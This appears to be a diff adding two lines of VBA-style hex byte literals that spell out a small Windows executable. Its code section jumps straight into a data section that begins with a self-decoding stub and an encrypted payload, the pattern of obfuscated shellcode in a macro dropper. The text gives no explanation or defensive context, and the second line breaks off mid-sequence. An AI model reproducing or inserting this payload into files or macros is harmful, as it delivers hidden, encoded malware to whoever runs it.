+&amp;H4D&amp;H5A&amp;H90&amp;H00&amp;H03&amp;H00&amp;H00&amp;H00&amp;H04&amp;H00&amp;H00&amp;H00&amp;HFF&amp;HFF&amp;H00&amp;H00&amp;HB8&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H40&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H80&amp;H00&amp;H00&amp;H00&amp;H0E&amp;H1F&amp;HBA&amp;H0E&amp;H00&amp;HB4&amp;H09&amp;HCD&amp;H21&amp;HB8&amp;H01&amp;H4C&amp;HCD&amp;H21&amp;H54&amp;H68&amp;H69&amp;H73&amp;H20&amp;H70&amp;H72&amp;H6F&amp;H67&amp;H72&amp;H61&amp;H6D&amp;H20&amp;H63&amp;H61&amp;H6E&amp;H6E&amp;H6F&amp;H74&amp;H20&amp;H62&amp;H65&amp;H20&amp;H72&amp;H75&amp;H6E&amp;H20&amp;H69&amp;H6E&amp;H20&amp;H44&amp;H4F&amp;H53&amp;H20&amp;H6D&amp;H6F&amp;H64&amp;H65&amp;H2E&amp;H0D&amp;H0D&amp;H0A&amp;H24&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H50&amp;H45&amp;H00&amp;H00&amp;H4C&amp;H01&amp;H03&amp;H00&amp;HBB&amp;HB1&amp;HD0&amp;H66&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;HE0&amp;H00&amp;H0F&amp;H03&amp;H0B&amp;H01&amp;H02&amp;H38&amp;H00&amp;H02&amp;H00&amp;H00&amp;H00&amp;H0E&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H10&amp;H00&amp;H00&amp;H00&amp;H10&amp;H00&amp;H00&amp;H00&amp;H20&amp;H00&amp;H00&amp;H00&amp;H00&amp;H40&amp;H00&amp;H00&amp;H10&amp;H00&amp;H00&amp;H00&amp;H02&amp;H00&amp;H00&amp;H04&amp;H00&amp;H00&amp;H00&amp;H01&amp;H00&amp;H00&amp;H00&amp;H04&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H40&amp;H00&amp;H00&amp;H00&amp;H02&amp;H00&amp;H00&amp;H46&amp;H3A&amp;H00&amp;H00&amp;H02&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H20&amp;H00&amp;H00&amp;H10&amp;H00&amp;H00&amp;H00&amp;H00&amp;H10&amp;H00&amp;H00&amp;H10&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H10&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H30&amp;H00&amp;H00&amp;H64&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H2E&amp;H74&amp;H65&amp;H78&amp;H74&amp;H00&amp;H00&amp;H00&amp;H28&amp;H00&amp;H00&amp;H00&amp;H00&amp;H10&amp;H00&amp;H00&amp;H00&amp;H02&amp;H00&amp;H00&amp;H00&amp;H02&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H20&amp;H00&amp;H30&amp;H60&amp;H2E&amp;H64&amp;H61&amp;H74&amp;H61&amp;H00&amp;H00&amp;H00&amp;H90&amp;H0A&amp;H00&amp;H00&amp;H00&amp;H20&amp;H00&amp;H00&amp;H00&amp;H0C&amp;H00&amp;H00&amp;H00&amp;H04&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H20&amp;H00&amp;H30&amp;HE0&amp;H2E&amp;H69&amp;H64&amp;H61&amp;H74&amp;H61&amp;H00&amp;H00&amp;H64&amp;H00&amp;H00&amp;H00&amp;H00&amp;H30&amp;H00&amp;H00&amp;H00&amp;H02&amp;H00&amp;H00&amp;H00&amp;H10&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H40&amp;H00&amp;H30&amp;HC0&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;HB8&amp;H00&amp;H20&amp;H40&amp;H00&amp;HFF&amp;HE0&amp;H90&amp;HFF&amp;H25&amp;H38&amp;H30&amp;H40&amp;H00&amp;H90&amp;H90&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;HFF&amp;HFF&amp;HFF&amp;HFF&amp;H00&amp;H00&amp;H00&amp;H00&amp;HFF&amp;HFF&amp;HFF&amp;HFF&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;HDB&amp;HC7&amp;HBA&amp;H1D&amp;H22&amp;HFA&amp;H31&amp;HD9&amp;H74&amp;H24&amp;HF4&amp;H5D&amp;H33&amp;HC9&amp;H66&amp;HB9&amp;H04&amp;H02&amp;H31&amp;H55&amp;H1A&amp;H03&amp;H55&amp;H1A&amp;H83&amp;HC5&amp;H19&amp;HC0&amp;H0F&amp;H00&amp;HE1&amp;H6C&amp;HF8&amp;H73&amp;HA1&amp;H6C&amp;H9C&amp;H8C&amp;H11&amp;H09&amp;HD5&amp;H53&amp;H88&amp;H3C&amp;H5F&amp;HB3&amp;HDE&amp;H82&amp;H50&amp;H6D&amp;H6A&amp;HD9&amp;H64&amp;HD0&amp;HBB&amp;HE8&amp;H34&amp;H7B&amp;H8A&amp;HBC&amp;H2E&amp;H07&amp;H02&amp;HBC&amp;H4C&amp;H51&amp;HEE&amp;H2B&amp;H9B&amp;H70&amp;HFE&amp;H3C&amp;H6B&amp;HC0&amp;HF7&amp;H86&amp;H25&amp;HF1&amp;HCA&amp;H40&amp;H37&amp;H05&amp;H10&amp;H27&amp;H76&amp;H33&amp;H39&amp;HC8&amp;HC4&amp;H99&amp;H6D&amp;HA9&amp;H60&amp;H45&amp;H4A&amp;H5F&amp;H09&amp;H57&amp;H0A&amp;H6D&amp;H13&amp;HB0&amp;HA5&amp;H39&amp;H56&amp;H0B&amp;H9D&amp;H9F&amp;HA6&amp;HA4&amp;H9D&amp;H02&amp;H8F&amp;H54&amp;HA0&amp;HE2&amp;HCD&amp;HF6&amp;H55&amp;HFF&amp;H5A&amp;H9D&amp;HE9&amp;H41&amp;H2A&amp;H8A&amp;H57&amp;H7D&amp;H44&amp;H32&amp;HD1&amp;H6A&amp;H32&amp;HF5&amp;H39&amp;HB4&amp;HC6&amp;H5F&amp;H87&amp;HF9&amp;HB2&amp;HFE&amp;HD4&amp;HB6&amp;HDC&amp;H22&amp;H91&amp;HAF&amp;H16&amp;H23&amp;HC0&amp;H27&amp;H4B&amp;HCA&amp;HD1&amp;HAA&amp;H3C&amp;HC7&amp;HAC&amp;HEE&amp;H9D&amp;H4A&amp;H20&amp;HC3&amp;HA2&amp;H00&amp;H66&amp;HB3&amp;H00&amp;H75&amp;H5B&amp;HAA&amp;H6C&amp;HFF&amp;H67&amp;H15&amp;H9A&amp;HB0&amp;H47&amp;HFA&amp;H89&amp;H31&amp;HA3&amp;HCE&amp;H84&amp;HCE&amp;H5C&amp;HA8&amp;HEB&amp;HEB&amp;HF7&amp;HC2&amp;H4D&amp;H5D&amp;H65&amp;H78&amp;H9B&amp;H5D&amp;H7A&amp;H53&amp;H39&amp;H47&amp;H82&amp;H97&amp;HDF&amp;H91&amp;H36&amp;H74&amp;H86&amp;H40&amp;H6F&amp;H92&amp;HCB&amp;H03&amp;H0D&amp;HC2&amp;H97&amp;HDD&amp;H6F&amp;H6C&amp;HDA&amp;HD5&amp;H33&amp;H7E&amp;H90&amp;HE2&amp;H39&amp;H9B&amp;H50&amp;H49&amp;H77&amp;H70&amp;H2C&amp;HE3&amp;H72&amp;H01&amp;H9D&amp;H88&amp;H11&amp;HBD&amp;HD2&amp;H44&amp;H66&amp;H04&amp;H43&amp;HDE&amp;HF0&amp;H0A&amp;H05&amp;HFD&amp;H4C&amp;H67&amp;H52&amp;H06&amp;HFE&amp;H06&amp;HAB&amp;HB6&amp;HAF&amp;H5A&amp;H4F&amp;HAC&amp;H2F&amp;H91&amp;HFC&amp;H69&amp;HE6&amp;HD1&amp;H96&amp;HB1&amp;H98&amp;HAC&amp;HF8&amp;HD9&amp;H82&amp;HA9&amp;H4B&amp;H06&amp;HC3&amp;H61&amp;H90&amp;HFB&amp;HF2&amp;H20&amp;H9C&amp;H50&amp;HB9&amp;HFF&amp;H52&amp;H3B&amp;HC9&amp;HB2&amp;HD1&amp;H6A&amp;H81&amp;H99&amp;HE2&amp;H8F&amp;H19&amp;H09&amp;HD2&amp;H30&amp;HE4&amp;H2D&amp;HCE&amp;H58&amp;H94&amp;HE1&amp;H14&amp;HCC&amp;H2D&amp;HCE&amp;HBB&amp;HBD&amp;H4D&amp;H82&amp;H7F&amp;H19&amp;HC4&amp;H96&amp;H24&amp;HB7&amp;H21&amp;HF1&amp;HFA&amp;H81&amp;HE7&amp;HDA&amp;H8C&amp;H10&amp;H37&amp;H6E&amp;H57&amp;H40&amp;H3B&amp;HDE&amp;H7C&amp;H64&amp;H3F&amp;H06&amp;H71&amp;HDF&amp;H7A&amp;H77&amp;HD0&amp;H95&amp;HDF&amp;HA2&amp;H91&amp;HE3&amp;H64&amp;H99&amp;HEA&amp;HA6&amp;H9D&amp;H63&amp;H91&amp;H0D&amp;H2C&amp;H3C&amp;H62&amp;H3F&amp;H74&amp;HE2&amp;H0D&amp;HCD&amp;HDD&amp;H8F&amp;H1E&amp;H69&amp;HF5&amp;HBE&amp;H72&amp;H22&amp;H27&amp;H23&amp;H60&amp;HE8&amp;H61&amp;H2C&amp;HCC&amp;H60&amp;H49&amp;H62&amp;H52&amp;H66&amp;HC4&amp;H0E&amp;HC7&amp;HEA&amp;H38&amp;H4C&amp;H8A&amp;HC0&amp;H07&amp;H05&amp;HA9&amp;H03&amp;H62&amp;H10&amp;HF8&amp;H73&amp;H4C&amp;H95&amp;H75&amp;H5C&amp;HB3&amp;H4A&amp;HA0&amp;H2B&amp;HF7&amp;H8E&amp;H57&amp;H03&amp;H8F&amp;H0E&amp;H9E&amp;HF6&amp;HE2&amp;H52&amp;HC1&amp;H06&amp;HCE&amp;H9F&amp;H3E&amp;HCA&amp;HF2&amp;H25&amp;HC4&amp;HB3&amp;H11&amp;HD6&amp;H41&amp;H47&amp;HD7&amp;H8A&amp;HE1&amp;HA4&amp;HA4&amp;HCE&amp;H63&amp;H01&amp;H88&amp;HBC&amp;H6D&amp;HE5&amp;HDF&amp;H4B&amp;H10&amp;H0B&amp;HB8&amp;H27&amp;HED&amp;HCB&amp;HB8&amp;HEE&amp;HE8&amp;H56&amp;HA1&amp;HD5&amp;HD3&amp;H35&amp;H6C&amp;H53&amp;H36&amp;H19&amp;H91&amp;H4D&amp;H5C&amp;H81&amp;H0A&amp;H65&amp;H97&amp;HA7&amp;H0B&amp;H11&amp;HE3&amp;H50&amp;H23&amp;H43&amp;H44&amp;HAE&amp;H37&amp;H7A&amp;H0F&amp;HE9&amp;H5A&amp;H92&amp;H0E&amp;H28&amp;H46&amp;H60&amp;HB0&amp;HE8&amp;HDF&amp;H47&amp;HDF&amp;H63&amp;H5F&amp;H4B&amp;HD1&amp;HB6&amp;H64&amp;H82&amp;H57&amp;H26&amp;H4C&amp;H46&amp;H61&amp;HCA&amp;H9B&amp;H41&amp;HDF&amp;H43&amp;H62&amp;H22&amp;H2E&amp;H77&amp;HBA&amp;H7D&amp;H60&amp;H40&amp;H02&amp;H95&amp;HC5&amp;HF8&amp;H83&amp;H26&amp;HB8&amp;H4C&amp;H0D&amp;H61&amp;HEC&amp;H46&amp;HA9&amp;HCF&amp;HF7&amp;H46&amp;H90&amp;H52&amp;H6A&amp;HD3&amp;H58&amp;HCC&amp;H6E&amp;HFF&amp;H51&amp;H83&amp;H84&amp;HFA&amp;H2E&amp;H60&amp;H0A&amp;H3A&amp;H50&amp;HFF&amp;H74&amp;HFC&amp;H61&amp;H55&amp;HD6&amp;H03&amp;HF9&amp;HE9&amp;H04&amp;H46&amp;HFE&amp;HF8&amp;HEB&amp;H43&amp;H69&amp;H1B&amp;H78&amp;HE1&amp;H4E&amp;H9A&amp;H16&amp;HB9&amp;H07&amp;H9D&amp;HF1&amp;H10&amp;H53&amp;HB9&amp;H52&amp;H3D&amp;H6C&amp;HA7&amp;H78&amp;H9C&amp;H6D&amp;H38&amp;H08&amp;H56&amp;HB4&amp;H32&amp;H2D&amp;H7F&amp;H23&amp;HAF&amp;H30&amp;H82&amp;H14&amp;H87&amp;HA9&amp;H6F&amp;H61&amp;HC5&amp;H17&amp;HFB&amp;H02&amp;H92&amp;H1C&amp;H1F&amp;H4C&amp;HF6&amp;HF3&amp;H17&amp;H49&amp;HF9&amp;H71&amp;HB7&amp;HD6&amp;HAD&amp;H8C&amp;H5E&amp;H5D&amp;H8C&amp;H38&amp;HBE&amp;H75&amp;H52&amp;H9A&amp;H21&amp;H00&amp;HE4&amp;H07&amp;H5B&amp;HA1&amp;H0A&amp;HB1&amp;H57&amp;HD3&amp;H0A&amp;H85&amp;HA4&amp;H9E&amp;HA1&amp;H5E&amp;H91&amp;H51&amp;HCC&amp;HAF&amp;H16&amp;HCE&amp;H11&amp;H6F&amp;HC0&amp;H60&amp;HEC&amp;H60&amp;HE9&amp;H2C&amp;H97&amp;H0B&amp;H74&amp;HD2&amp;H5B&amp;HEF&amp;H6A&amp;HAD&amp;H9B&amp;H4B&amp;H94&amp;HCE&amp;HB1&amp;H95&amp;H45&amp;H13&amp;H6B&amp;H50&amp;HF1&amp;H5E&amp;HF1&amp;H68&amp;H5D&amp;HE0&amp;H5B&amp;HC5&amp;H67&amp;H7E&amp;H3D&amp;H82&amp;HD3&amp;H98&amp;HDB&amp;HC1&amp;H8A&amp;H03&amp;HE8&amp;H27&amp;H95&amp;H09&amp;H0A&amp;HEC&amp;H30&amp;H55&amp;HE9&amp;HA9&amp;H6B&amp;H47&amp;HCF&amp;H8E&amp;HA3&amp;H7B&amp;HD9&amp;HF5&amp;H72&amp;HE1&amp;H40&amp;H12&amp;H3E&amp;HAD&amp;HD4&amp;H5F&amp;H15&amp;H35&amp;H60&amp;H24&amp;H5B&amp;HD4&amp;HD8&amp;HF6&amp;HED&amp;HBE&amp;H91&amp;H29&amp;H20&amp;H9C&amp;H6E&amp;H40&amp;H82&amp;HCC&amp;H9D&amp;H6C&amp;H18&amp;H5A&amp;HC5&amp;H14&amp;H5F&amp;H92&amp;HB1&amp;HC2&amp;H82&amp;HFA&amp;H6C&amp;H0F&amp;H4F&amp;HCD&amp;HFA&amp;H38&amp;HC4&amp;HB0&amp;HD0&amp;H02&amp;H77&amp;HF9&amp;H02&amp;HD9&amp;H7C&amp;HA2&amp;H9F&amp;H9B&amp;H80&amp;H0B&amp;HE2&amp;H6A&amp;H81&amp;HD6&amp;H59&amp;H5F&amp;H0E&amp;H1A&amp;HAB&amp;HAD&amp;HFB&amp;HC7&amp;HC0&amp;HA4&amp;HE8&amp;H64&amp;H7C&amp;H0A&amp;H41&amp;H05&amp;HA1&amp;H4E&amp;H51&amp;H36&amp;H95&amp;H68&amp;HC7&amp;H6F&amp;H91&amp;H8B&amp;H59&amp;H63&amp;H1A&amp;H36&amp;H39&amp;H35&amp;H77&amp;H95&amp;HBA&amp;H27&amp;HA6&amp;H2B&amp;H01&amp;H1F&amp;H35&amp;H43&amp;HBD&amp;H54&amp;HC4&amp;H14&amp;HC7&amp;H34&amp;H33&amp;H04&amp;HD0&amp;H92&amp;H08&amp;H56&amp;HDD&amp;H92&amp;HE1&amp;HE9&amp;H58&amp;HD8&amp;H4E&amp;H73&amp;HE3&amp;HF9&amp;HA4&amp;HF0&amp;H72&amp;H7A&amp;HD2&amp;H30&amp;H50&amp;HF2&amp;H58&amp;H10&amp;HE5&amp;H05&amp;HFC&amp;H7B&amp;HFD&amp;H8E&amp;HCC&amp;HEF&amp;H1A&amp;HB8&amp;H39&amp;H98&amp;HD1&amp;HA2&amp;H25&amp;H4C&amp;HE8&amp;H1E&amp;HBC&amp;H29&amp;H8F&amp;HA9&amp;H9D&amp;H61&amp;HF0&amp;H75&amp;H21&amp;H62&amp;H6E&amp;H04&amp;H67&amp;H0A&amp;H35&amp;H35&amp;HED&amp;HC2&amp;H62&amp;H25&amp;H67&amp;H57&amp;H9E&amp;HC4&amp;HD5&amp;H32&amp;H66&amp;H7C&amp;HFA&amp;H01&amp;H98&amp;H45&amp;H7B&amp;HB7&amp;H06&amp;HF9&amp;H68&amp;HD0&amp;HFC&amp;H42&amp;HD7&amp;HA1&amp;H54&amp;HA9&amp;H6A&amp;H74&amp;H58&amp;H7E&amp;HBE&amp;HFC&amp;HA7&amp;H68&amp;H1D&amp;H6A&amp;HF6&amp;HE8&amp;H59&amp;HDE&amp;H20&amp;HC2&amp;H2E&amp;HE1&amp;H5E&amp;HB4&amp;HF7&amp;H98&amp;H75&amp;H77&amp;H91&amp;H72&amp;HED&amp;HF8&amp;HC3&amp;H27&amp;HD6&amp;HF1&amp;H00&amp;H1C&amp;HF6&amp;HEE&amp;HA6&amp;H79&amp;H1D&amp;H7A&amp;HFE&amp;H6E&amp;H1E&amp;HFB&amp;HD5&amp;H5C&amp;HF7&amp;H5D&amp;HC5&amp;HC0&amp;HA8&amp;H06&amp;HEC&amp;HB0&amp;H2B&amp;H80&amp;H89&amp;HC0&amp;H3F&amp;H74&amp;H31&amp;H1E
+&amp;HF7&amp;H7E&amp;H77&amp;H39&amp;H0A&amp;H5A&amp;H17&amp;H92&amp;HED&amp;H7A&amp;H12&amp;HA7&amp;H53&amp;H73&amp;H0D&amp;H41&amp;H8B&amp;H80&amp;HEB&amp;HD3&amp;HBA&amp;H81&amp;H08&amp;H97&amp;HA6&amp;HD3&amp;H12&amp;H4F&amp;H4B&amp;HDD&amp;H5D&amp;HF7&amp;HD4&amp;H8B&amp;H4F&amp;HC3&amp;H96&amp;HF1&amp;H1B&amp;H72&amp;H01&amp;HF0&amp;H8B&amp;H96&amp;HAE&amp;H5E&amp;H94&amp;HC7&amp;H67&amp;H48&amp;H15&amp;H2A&amp;HA5&amp;HBA&amp;H66&amp;H64&amp;HAA&amp;H18&amp;HB5&amp;HD2&amp;H06&amp;HE9&amp;H5F&amp;HC8&amp;HC4&amp;H7B&amp;HD2&amp;H65&amp;H24&amp;HEC&amp;HB3&amp;H4E&amp;H4E&amp;H15&amp;HC0&amp;H44&amp;H89&amp;HFD&amp;H5D&amp;H31&amp;HBE&amp;H09&amp;HD0&amp;H90&amp;H7F&amp;HFA&amp;H0F&amp;HE3&amp;HBA&amp;HC6&amp;HD7&amp;H0F&amp;HFE&amp;HEA&amp;H5E&amp;HB4&amp;HC1&amp;H70&amp;HC2&amp;H6E&amp;H3E&amp;HC9&amp;H4A&amp;HEB&amp;H9D&amp;H5E&amp;H44&amp;H9B&amp;H8E&amp;HBE&amp;H7C&amp;H9F&amp;H54&amp;H2B&amp;H65&amp;HA1&amp;HBA&amp;HAB&amp;HE4&amp;H19&amp;H7D&amp;HDD&amp;HFE&amp;HB6&amp;HAF&amp;H2C&amp;H41&amp;HFE&amp;HAF&amp;HE4&amp;H50&amp;H0A&amp;HEE&amp;H00&amp;H84&amp;HE8&amp;H8A&amp;H87&amp;HC2&amp;H5B&amp;HFD&amp;HAF&amp;H5C&amp;H7F&amp;H4A&amp;H78&amp;HEE&amp;HCE&amp;HEF&amp;H63&amp;H6A&amp;H08&amp;H6C&amp;H2D&amp;HF9&amp;H5B&amp;H38&amp;HF8&amp;H81&amp;H33&amp;H4B&amp;H19&amp;H42&amp;H05&amp;HEF&amp;H98&amp;HAA&amp;H65&amp;H2E&amp;H2C&amp;H31&amp;HAB&amp;HEC&amp;H4E&amp;HE9&amp;HF8&amp;HD9&amp;H50&amp;H0D&amp;HC0&amp;H2B&amp;H38&amp;HF1&amp;H52&amp;HFA&amp;H46&amp;HF4&amp;HD8&amp;HD4&amp;HD9&amp;HAA&amp;H4C&amp;HE0&amp;H08&amp;H8B&amp;H31&amp;HB8&amp;HBE&amp;HAE&amp;HAB&amp;H02&amp;H68&amp;H1C&amp;H16&amp;HC0&amp;HA1&amp;H35&amp;HFD&amp;H4C&amp;HEF&amp;H2E&amp;H48&amp;H5C&amp;H92&amp;H45&amp;H6E&amp;H30&amp;HC3&amp;H82&amp;H2D&amp;H27&amp;HBF&amp;H8D&amp;HB0&amp;H9E&amp;HF9&amp;H2A&amp;HA2&amp;HDB&amp;H3A&amp;HF2&amp;HC5&amp;H66&amp;H87&amp;HA3&amp;HD4&amp;H3D&amp;HAD&amp;H09&amp;H23&amp;H56&amp;HDB&amp;H07&amp;H65&amp;H64&amp;HDF&amp;H85&amp;H0B&amp;HDE&amp;H61&amp;H77&amp;H3E&amp;H75&amp;HDB&amp;H91&amp;HFE&amp;HC2&amp;H50&amp;H6C&amp;HC7&amp;H7C&amp;HE0&amp;HBA&amp;H95&amp;HBF&amp;HF8&amp;H7F&amp;H67&amp;HBB&amp;H6C&amp;H40&amp;H38&amp;H88&amp;H05&amp;H2B&amp;HE3&amp;H0E&amp;HE3&amp;H32&amp;HF1&amp;HAB&amp;H66&amp;H93&amp;H58&amp;HF9&amp;H92&amp;HC8&amp;HFE&amp;H76&amp;HD6&amp;HEB&amp;H63&amp;HFE&amp;HB0&amp;H75&amp;HD5&amp;H76&amp;H4D&amp;HB6&amp;H96&amp;H01&amp;HB6&amp;H72&amp;HDF&amp;H41&amp;H45&amp;HF3&amp;H4B&amp;H9E&amp;H12&amp;H51&amp;H93&amp;HA5&amp;H82&amp;H51&amp;H3B&amp;H9C&amp;HF9&amp;HA1&amp;H4C&amp;HF7&amp;HE8&amp;HE1&amp;HE6&amp;H37&amp;H12&amp;HC5&amp;HAE&amp;HF6&amp;HED&amp;H0A&amp;HAA&amp;HE4&amp;HE6&amp;H17&amp;H7E&amp;HAB&amp;H67&amp;HFE&amp;H00&amp;HF3&amp;H36&amp;H3E&amp;H45&amp;H67&amp;HD8&amp;H87&amp;HD3&amp;HFC&amp;H12&amp;H0C&amp;HED&amp;HB5&amp;H07&amp;